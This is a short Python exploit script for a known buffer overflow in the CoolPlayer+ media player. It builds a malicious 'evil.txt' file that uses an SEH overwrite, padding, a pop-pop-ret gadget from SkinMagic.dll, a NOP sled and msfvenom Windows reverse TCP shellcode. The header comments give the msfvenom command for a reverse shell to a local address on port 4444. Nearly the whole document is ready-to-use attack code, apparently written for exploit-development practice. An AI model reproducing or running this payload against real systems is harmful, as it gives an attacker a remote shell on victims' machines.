# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in CoolPlayer+. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.


# SEH offser: 1000
#   0x1002ce91 : pop ebx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [SkinMagic.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.8.1.1 (C:\Program Files\Easy CD DVD Copy\SkinMagic.dll)
# badchars: \x00\x0A\x0D
# shellcode command: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00\x0A\x0D' -f python -v scode


file = open("evil.txt","w")

scode =  ""
scode += "\xda\xd9\xd9\x74\x24\xf4\xbe\x28\xbb\xc4\xbf\x5a\x33"
scode += "\xc9\xb1\x56\x31\x72\x18\x83\xc2\x04\x03\x72\x3c\x59"
scode += "\x31\x43\xd4\x1f\xba\xbc\x24\x40\x32\x59\x15\x40\x20"
scode += "\x29\x05\x70\x22\x7f\xa9\xfb\x66\x94\x3a\x89\xae\x9b"
scode += "\x8b\x24\x89\x92\x0c\x14\xe9\xb5\x8e\x67\x3e\x16\xaf"
scode += "\xa7\x33\x57\xe8\xda\xbe\x05\xa1\x91\x6d\xba\xc6\xec"
scode += "\xad\x31\x94\xe1\xb5\xa6\x6c\x03\x97\x78\xe7\x5a\x37"
scode += "\x7a\x24\xd7\x7e\x64\x29\xd2\xc9\x1f\x99\xa8\xcb\xc9"
scode += "\xd0\x51\x67\x34\xdd\xa3\x79\x70\xd9\x5b\x0c\x88\x1a"
scode += "\xe1\x17\x4f\x61\x3d\x9d\x54\xc1\xb6\x05\xb1\xf0\x1b"
scode += "\xd3\x32\xfe\xd0\x97\x1d\xe2\xe7\x74\x16\x1e\x63\x7b"
scode += "\xf9\x97\x37\x58\xdd\xfc\xec\xc1\x44\x58\x42\xfd\x97"
scode += "\x03\x3b\x5b\xd3\xa9\x28\xd6\xbe\xa5\x9d\xdb\x40\x35"
scode += "\x8a\x6c\x32\x07\x15\xc7\xdc\x2b\xde\xc1\x1b\x3a\xc8"
scode += "\xf1\xf4\x84\x99\x0f\xf5\xf4\xb0\xcb\xa1\xa4\xaa\xfa"
scode += "\xc9\x2f\x2b\x02\x1c\xc5\x21\x94\x5f\xb1\x1d\x78\x08"
scode += "\xc3\x61\x91\x94\x4a\x87\xc1\x74\x1c\x18\xa2\x24\xdc"
scode += "\xc8\x4a\x2f\xd3\x37\x6a\x50\x3e\x50\x01\xbf\x96\x08"
scode += "\xbe\x26\xb3\xc3\x5f\xa6\x6e\xae\x60\x2c\x9a\x4e\x2e"
scode += "\xc5\xef\x5c\x47\xb2\x0f\x9d\x98\x57\x0f\xf7\x9c\xf1"
scode += "\x58\x6f\x9f\x24\xae\x30\x60\x03\xad\x37\x9e\xd2\x87"
scode += "\x4c\xa9\x40\xa7\x3a\xd6\x84\x27\xbb\x80\xce\x27\xd3"
scode += "\x74\xab\x74\xc6\x7a\x66\xe9\x5b\xef\x89\x5b\x0f\xb8"
scode += "\xe1\x61\x76\x8e\xad\x9a\x5d\x8c\xaa\x64\x23\xbb\x12"
scode += "\x0c\xdb\xfb\xa2\xcc\xb1\xfb\xf2\xa4\x4e\xd3\xfd\x04"
scode += "\xae\xfe\x55\x0c\x25\x6f\x17\xad\x3a\xba\xf9\x73\x3a"
scode += "\x49\x22\x84\x41\x22\xd5\x65\xb6\x2a\xb2\x66\xb6\x52"
scode += "\xc4\x5b\x60\x6b\xb2\x9a\xb0\xc8\xcd\xa9\x95\x79\x44"
scode += "\xd1\x8a\x7a\x4d"

evilString = "A" * 996 + "\xEB\x12\x90\x90" + "\x91\xCE\x02\x10" + "\x90" * 30 + scode + "\x90" * 2110

file.write(evilString)
file.close()
